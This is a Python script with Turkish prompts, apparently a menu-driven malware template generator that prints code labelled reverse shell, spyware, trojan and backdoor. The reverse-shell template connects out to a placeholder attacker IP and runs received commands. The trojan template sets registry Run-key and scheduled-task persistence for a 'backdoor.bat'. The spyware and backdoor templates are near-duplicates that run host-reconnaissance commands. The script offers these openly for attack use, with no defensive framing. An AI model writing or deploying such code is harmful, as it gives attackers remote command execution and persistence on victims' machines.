import socket
import subprocess
import os
import platform

def revershell():
    print('''
import socket
import subprocess

ip = 'your_ip'  # Hedef IP adresini buraya yazın
port = 1234      # Port numarasını buraya yazın
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

while True:
    veri = s.recv(1024).decode('utf-8')
    if veri.lower() == 'exit':
        break
    elif veri.lower().startswith('cd'):
        try:
            os.chdir(veri[3:])
            s.send(b'Changed directory\n')
        except FileNotFoundError:
            s.send(b'Directory not found\n')
    else:
        output = subprocess.run(veri, shell=True, capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())

s.close()
''')

def spyware():
    print('''
import os
import subprocess

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

commands = [
    'ipconfig', 'netstat', 'tasklist', 'dir', 'whoami', 'hostname'
]

for command in commands:
    result = run_command(command)
    print(f"Result of {command}:\n{result}\n")
''')

def trojan():
    print('''
import os
import subprocess

def add_to_registry():
    try:
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "BackdoorApp" /t REG_SZ /d "C:\\path\\to\\backdoor.bat" /f')
    except Exception as e:
        print(f"Error adding to registry: {e}")

def add_scheduled_task():
    try:
        os.system('schtasks /create /tn "BackdoorTask" /tr "C:\\path\\to\\backdoor.bat" /sc onlogon')
    except Exception as e:
        print(f"Error creating scheduled task: {e}")

# Geriye kalan işler
add_to_registry()
add_scheduled_task()
''')

def backdoor():
    print('''
import os
import subprocess

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

commands = [
    'ipconfig /all', 'netstat -an', 'tasklist', 'whoami', 'hostname'
]

for command in commands:
    result = run_command(command)
    print(f"Result of {command}:\n{result}\n")
''')
def show_ascii_art():
    print('''
M     M  CCCCC  W   W
MM   MM  C       W W W
M M M M  C       WW WW
M  M  M  C       W W W
M     M  CCCCC   W   W
    ''')

def main():
    show_ascii_art()
    print('1:revershell')
    print('2:spyware')
    print('3:trojan')
    print('4:backdoor')
    yaz = input("Bir seçenek girin: ")
    
    
    if yaz == '1':
        revershell()
    elif yaz == '2':
        spyware()
    elif yaz == '3':
        trojan()
    elif yaz == '4':
        backdoor()
    else:
        print("Geçersiz seçenek!")

if __name__ == '__main__':
    main()
